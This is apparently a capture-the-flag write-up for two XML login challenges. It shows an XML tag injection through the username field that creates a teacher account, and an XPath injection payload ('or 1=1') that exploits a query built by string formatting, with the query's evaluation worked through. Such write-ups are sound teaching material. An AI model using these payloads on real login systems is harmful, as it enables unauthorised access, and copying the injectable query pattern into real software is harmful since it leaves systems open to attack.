# XML Injection

## Teacher Login 6

```text
XML Injection Login

Welcome! Can you log in as teacher?

Current Database (users.xml)
<users></users>

Add a User
Username:

Login
Username: 
```

The input fields are of **text** type

After adding a couple of users, the db looks like:

```xml
<users><user><username>user</username><is_teacher>no</is_teacher></user><user><username>user2</username><is_teacher>no</is_teacher></user></users>
```

Injecting `<is_teacher>yes</is_teacher>` using the payload:

```text
user3</username><is_teacher>yes</is_teacher></user><user><username>user4
```

The result db:

```xml
<users><user><username>user</username><is_teacher>no</is_teacher></user><user><username>user2</username><is_teacher>no</is_teacher></user><user><username>user3</username><is_teacher>yes</is_teacher></user><user><username>user4</username><is_teacher>no</is_teacher></user></users>
```

Logging in by "user3" gives the flag

## Teacher Login 7

The previous solution doesn't work as the input is being parsed; `<` and `>` are converted into `&lt;` and `&gt;`

In the sever code, we observe that XPath is being used to query:

```python
query = f"//user[username/text()='{username}' and is_teacher/text()='yes']"
```

[XPath Injection](https://owasp.org/www-community/attacks/XPATH_Injection) using the follwing username:

```text
user' or 1=1 or 'a'='a
```

This results in the following xpath query:

```text
//user[username/text()='user' or 1=1 or 'a'='a' and is_teacher/text()='yes']
username = 'user' or 1=1 or 'a'='a' and is_teacher='yes'
(username = 'user' or 1=1) or ('a'='a' and is_teacher='yes')
(false or true) or (true and false)
true or false
true
```

Logging in gives the flag
